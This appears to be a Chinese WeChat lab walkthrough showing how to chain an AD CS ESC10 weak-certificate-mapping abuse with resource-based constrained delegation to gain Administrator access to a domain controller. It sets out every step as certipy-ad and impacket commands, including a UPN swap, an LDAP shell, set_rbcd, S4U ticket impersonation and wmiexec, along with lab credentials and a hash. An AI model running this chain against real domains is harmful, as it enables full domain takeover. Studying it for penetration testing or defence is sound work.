---
title: ESC10结合RBCD链式利用
url: https://mp.weixin.qq.com/s/gDceOks0upbh14GUsDm5Bw
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:06:19.574013
---

# ESC10结合RBCD链式利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JibvIcnkZHNdLqddqS5F16yMAwXgmibXpxEoKPhZoxJ0vgGoJCBtyibabRWFMBJSicXeIJD46KiaGcDhXaSCuyXnGavqic4qmv87V0XCmKwcCPuicI/0?wx_fmt=jpeg)

# ESC10结合RBCD链式利用

原创

Jzhoucdc
Jzhoucdc

攻防之路JZhoucdc

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

1.前提

常规 ESC10利用中，通常直接利用证书通过 PKINIT 获取目标的 TGT，但本场景因为目标域控开启了 **Schannel 限制（禁止 PKINIT）**，手法发生变化。这里使用**ESC10结合 RBCD（基于资源的约束性委派）** 的进行链式利用。

2.利用要求

### 注册表键值：`CertificateMappingMethods = 0x4`（无强映射）

**含义**：`0x4` 代表使用了 **“弱映射（Weak Mapping）”** 机制。即 Schannel（LDAPS）在验证证书时，**仅通过证书中的 UPN（用户主体名称）去 AD 里查找对应用户**，而不会强制校验证书的“颁发者”或“序列号”是否与该用户对象绑定的 SID 强匹配。

3.案例

测试环境为靶机环境

修改user2的UPN为DC机器名称

```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local' -target 10.129.228.236
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNcaTzDKgp49M35waLRMj30baof7aOOkKF9MU8FM0gOCT8rwXG2pWiaEYA0G6fmQWxklmVco7ACib4aPLcwjF48xu8dHZtT58iaXL0/640?wx_fmt=png&from=appmsg)

利用user2凭证申请一个DC证书

```
certipy-ad req -u 'user2@lab.local' -hashes ee22ddf0f8a66db4217050e6a948f9d6 -ca lab-LAB-DC-CA -template User -target 10.129.228.236
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNclGibuPXsKFutKb1icscLqd4j8P7GicmoziaoBVy2yr3EichR3eZ2sS0DuOaDjToKcw73GYthKIXWTVxwg2QJAtBeUwUyM9dx8FSvk/640?wx_fmt=png&from=appmsg)

然后恢复user2的UPN

```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local -target 10.129.228.236 -dc-ip 10.129.228.236
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNeuCqsKQUXIKqqm31CC1ONjkA2IyuPUzYo0f0hcfYGZx54oI8OSJbQVTlCtD8tia3Lr2SsOLlpzxfGEF1QA1ReBNiajhIye78rno/640?wx_fmt=png&from=appmsg)

通过 Schannel 进行身份验证，目前环境存在限制，无法通过`PKINIT` 进行身份验证开启一个 LDAP shell

```
certipy-ad auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell -dc-ip 10.129.228.236
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNeNIMtia7om6Wv9suqe5tSaIsbHiaKGVANTP6zlVs3icjfsicN8qtKGfsx3TgKGib1ECNtF0plsOsdRS2YKncbpXEaONhPOGNPZQd6c/640?wx_fmt=png&from=appmsg)

这里，打算进行RBCD（基于资源的约束性委派）利用，原理是：通过修改域控的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性来控制允许列表。首先创建了一个新的计算机plainext，密码是plaintex123;然后

```
set_rbcd lab-dc$ plaintext$
```

将 `plaintext$` 的 SID 写入到 `LAB-DC$` 计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中。

下一步：使用 impacket-`getST`，以 `plaintext$` 的身份（拥有密码 `plaintext123`）向 KDC 发起请求。

```
impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.228.236 lab.local/'plaintext$':plaintext123
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNcOJkF6reYoosBkNMGmRDXibXOgFpmJRU5XtoCLA8kNdvGuxdjaXMCBoQFW4OZQyDtWeNFCk7ibibapLKQSLOOlKmtmnzchFzpfto/640?wx_fmt=png&from=appmsg)

**技术原理（S4U2Self + S4U2Proxy）**：

1. **S4U2Self**：`plaintext$` 向 KDC 请求一个针对自身的、指向 `Administrator` 的“可转发票据”（Forwardable TGT）。这一步不需要域控允许，只要 plaintext$ 自身拥有有效的 Kerberos 凭证即可。
2. **S4U2Proxy**：`plaintext$` 拿着这张可转发票据，向 KDC 请求一个用于访问 `cifs/LAB-DC`（文件共享服务）的服务票据。
3. **KDC 的校验**：KDC 收到请求后，会检查目标资源（`LAB-DC$`）的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。由于该属性中明确包含了 `plaintext$` 的 SID，KDC 判定允许委派，于是颁发 `Administrator` 访问 `CIFS` 服务的票据。

最后使用Administrator的TGT连接DC

```
KRB5CCNAME=Administrator@cifs_LAB-DC.LAB.LOCAL@LAB.LOCAL.ccache impacket-wmiexec -k -no-pass LAB-DC.LAB.LOCAL
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNfciaNr9SfHV5xSzzXahGC8vDQXAl3avLJvXh0Q3DiaNnZfXibEPvbBr9Q382Vnu7HtCoRdvgNpkPbCFSI8bae1PNxvqdQ52F1lTI/640?wx_fmt=png&from=appmsg)

###

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/9TcGQTMQS71Y9RxBw7gPUNkibkBV22AxHU4QjFr3hERqQyWNHIiaaY3As9x7WgZrL6KZgBf16kN1gUibEyQW4akxQ/0?wx_fmt=png)

攻防之路JZhoucdc

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9TcGQTMQS71Y9RxBw7gPUNkibkBV22AxHU4QjFr3hERqQyWNHIiaaY3As9x7WgZrL6KZgBf16kN1gUibEyQW4akxQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过